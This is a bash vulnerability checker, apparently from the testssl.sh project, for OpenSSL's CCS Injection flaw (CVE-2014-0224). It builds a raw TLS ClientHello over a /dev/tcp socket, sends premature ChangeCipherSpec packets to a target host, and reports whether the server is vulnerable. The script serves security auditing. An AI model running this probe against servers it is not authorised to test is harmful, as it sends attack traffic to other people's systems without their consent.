#!/bin/bash 

# POC bash socket implementation of CCS Injection vulnerability in OpenSSL (CVE-2014-0224), 
# see https://www.openssl.org/news/secadv_20140605.txt
# Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt 
#
# sockets inspired by http://blog.chris007.de/?p=238
# mainly adapted from the C code from https://gist.github.com/rcvalle/71f4b027d61a78c42607
# thx Ramon de C Valle
#
###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######

readonly PS4='${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
trap "cleanup" QUIT EXIT

[ -z "$1" ] && exit 1

NODE="$1"
PORT="443"
SLEEP=2
MAXSLEEP=10
OCKREPLY=""
COL_WIDTH=32
DEBUG=${DEBUG:-0}

TLSV=${2:-01}
# TLS 1.0=x01  1.1=0x02, 1.2=0x3
# the PoC contains per default only check for TLS1.0 as the is the least common denominator

ccs_message="\x14\x03\x$TLSV\x00\x01\x01"

client_hello="
# TLS header ( 5 bytes)
,x16,               # Content type (x16 for handshake)
x03, x$TLSV,        # TLS Version
x00, x93,           # Length total
# Handshake header
x01,                # Type (x01 for ClientHello)
x00, x00, x8f,      # Length client hello
x03, x$TLSV,        # TLS Version
x53, x9c, xb2, xcb, # 4 bytes Unix time  see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
x4b, x42, xf9, x2d, x0b, xe5, x9c, x21, # 28 bytes random bytes
xf5, xa3, x89, xca, x7a, xd9, xb4, xab, 
x3f, xd3, x22, x21, x5e, xc4, x65, x0d, 
x1e, xce, xed, xc2,
x00,                # Session ID length
x00, x68,           # Cipher suites length
  xc0, x13,         # ciphers come now, here: ECDHE-RSA-AES128-SHA = TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
  xc0, x12,
  xc0, x11,
  xc0, x10,
  xc0, x0f,
  xc0, x0e,
  xc0, x0d,
  xc0, x0c,
  xc0, x0b,
  xc0, x0a,
  xc0, x09,
  xc0, x08,
  xc0, x07,
  xc0, x06,
  xc0, x05,
  xc0, x04,
  xc0, x03,
  xc0, x02,
  xc0, x01,
  x00, x39,
  x00, x38,
  x00, x37,
  x00, x36,
  x00, x35,
  x00, x34,
  x00, x33,
  x00, x32,
  x00, x31,
  x00, x30,
  x00, x2f,
  x00, x16,
  x00, x15,
  x00, x14,
  x00, x13,
  x00, x12,
  x00, x11,
  x00, x10,
  x00, x0f,
  x00, x0e,
  x00, x0d,
  x00, x0c,
  x00, x0b,
  x00, x0a,
  x00, x09,
  x00, x08,
  x00, x07,
  x00, x06,
  x00, x05,
  x00, x04,
  x00, x03,
  x00, x02,
  x00, x01,  # TLS_RSA_WITH_NULL_MD5
  x01, x00"  # compression methods length (1) + Compression method(1)

#msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`
msg=$(echo "$client_hello" | sed -e 's/# .*$//g' -e 's/ //g' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; /^$/d' | sed 's/,/\\/g' | tr -d '\n')


parse_hn_port() {
     # strip "https", supposed it was supplied additionally
     echo $NODE | grep -q 'https://' && NODE=`echo $NODE | sed -e 's/https\:\/\///' `

     # strip trailing urlpath
     NODE=`echo $NODE | sed -e 's/\/.*$//'`

     # determine port, supposed it was supplied additionally
     echo $NODE | grep -q ':' && PORT=`echo $NODE | sed 's/^.*\://'` && NODE=`echo $NODE | sed 's/\:.*$//'`
     echo -e "\n===> connecting to $NODE:$PORT\n"
}

wait_kill(){
     pid=$1
     maxsleep=$2
     while true; do
          if ! ps $pid >/dev/null ; then
               return 0  # didn't reach maxsleep yet
          fi
          sleep 1
          maxsleep=$((maxsleep - 1))
          test $maxsleep -eq 0 && break
     done # needs to be killed:
     kill $pid >&2 2>/dev/null
     wait $pid 2>/dev/null
     return 3   # killed
}


socksend() {
     data=`echo $1`
     echo "\"$data\""
     echo -en "$data" >&5 &
     sleep $SLEEP
}

sockread() {
     [[ "x$2" == "x" ]] && maxsleep=$MAXSLEEP || maxsleep=$2
     ret=0

     ddreply=$(mktemp /tmp/ddreply.XXXXXX) || return 7
     dd bs=$1 of=$ddreply count=1 <&5 2>/dev/null &
     wait_kill $! $maxsleep
     ret=$?
     SOCKREPLY=$(cat $ddreply)
     rm $ddreply

     return $ret
}

# arg1: string to send
# arg2: success string, yet to be parsed
starttls_line0() {
     echo "$1" >&5
     cat <&5 &
     wait_kill $! $SLEEP
     #[ $? -eq 3 ] && fixme "STARTTLS timed out" && exit 1
}


ok_ids() {
     echo
     tput bold; tput setaf 2; echo "ok -- something resetted our ccs packets"; tput sgr0
     echo
     exit 0
}

fd_socket(){
     if ! exec 5<> /dev/tcp/$NODE/$PORT; then
          echo "`basename $0`: unable to connect to $NODE:$PORT"
          exit 2
     fi

     case "$1" in # port
          21)  # https://tools.ietf.org/html/rfc4217
               starttls_line0 "FEAT"
               starttls_line0 "AUTH TLS"
               ;;
          25)  #https://tools.ietf.org/html/rfc4217
               starttls_line0 "EHLO testssl.sh" "250"
               starttls_line0 "STARTTLS" "220"
               ;;
          110) # https://tools.ietf.org/html/rfc2595
               starttls_line0 "STLS" "OK"
               ;;
          119|433) # https://tools.ietf.org/html/rfc4642
               starttls_line0 "CAPABILITIES" "101"
               starttls_line0 "STARTTLS" "382"
               ;;
          143) # https://tools.ietf.org/html/rfc2595 
               starttls_line0 "a001 CAPABILITY" "OK"
               starttls_line0 "a002 STARTTLS" "OK"
               ;;
          389) # https://tools.ietf.org/html/rfc2830, https://tools.ietf.org/html/rfc4511
               fixme "LDAP: FIXME not yet implemented"
               exit 1
               ;;
          674) # https://tools.ietf.org/html/rfc2595
               fixme "ACAP: FIXME not yet implemented"
               exit 1
               ;;
          5222)
               starttls_line0 "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>" "proceed"
               fixme "XMPP: FIXME not yet implemented"
               ;;
          443|995|993|465|*)  # we don't need a special command here
               ;;
     esac
     echo
}

close_socket(){
     exec 5<&-
     exec 5>&-
     return 0
}

cleanup() {
     close_socket
}


#### main

parse_hn_port 
fd_socket $PORT


echo "##### sending standard client hello with TLS version 03,$TLSV:"
socksend "$msg" $TLSV
sleep 1

sockread 16384
echo "##### reading server hello:"
if test $DEBUG ; then
     echo "$SOCKREPLY" | xxd -c$COL_WIDTH | head -10
     echo "[...]"
     echo
fi
if [ 1 -ge $(echo "$SOCKREPLY" | xxd | wc -l) ]; then
     tput bold; tput setaf 5; echo "TLS handshake failed"; tput sgr0
     exit 1
fi


echo "##### sending ccs injection payload with TLS version 03,$TLSV (1)"
socksend "$ccs_message" $TLSV || ok_ids
sleep 1
echo "##### sending ccs injection payload with TLS version 03,$TLSV (2)"
socksend "$ccs_message" $TLSV || ok_ids
sleep 1

sockread 65534
echo
echo "###### reply: "
echo "============================="
echo "$SOCKREPLY" | xxd -c$COL_WIDTH | head -20
echo "============================="
echo

reply_sanitized=$(echo -e "$SOCKREPLY" | xxd -p | tr -cd '[:print:]' | sed 's/^..........//')
test $DEBUG || echo $reply_sanitized 

lines=$(echo -e "$SOCKREPLY" | xxd -c32 | wc -l)
test $DEBUG || echo $lines

if [ "$lines" -gt 1 ] || [ "$reply_sanitized" == "0a" ] ;then
     tput bold; tput setaf 2; echo "ok"; tput sgr0
     ret=0
else
     tput bold; tput setaf 1; echo "VULNERABLE"; tput sgr0
     ret=1
fi


echo
exit $ret

#  vim:tw=100:ts=5:sw=5:expandtab
#  $Id: ccs-injection.bash,v 1.7 2015/07/01 17:48:00 dirkw Exp $ 
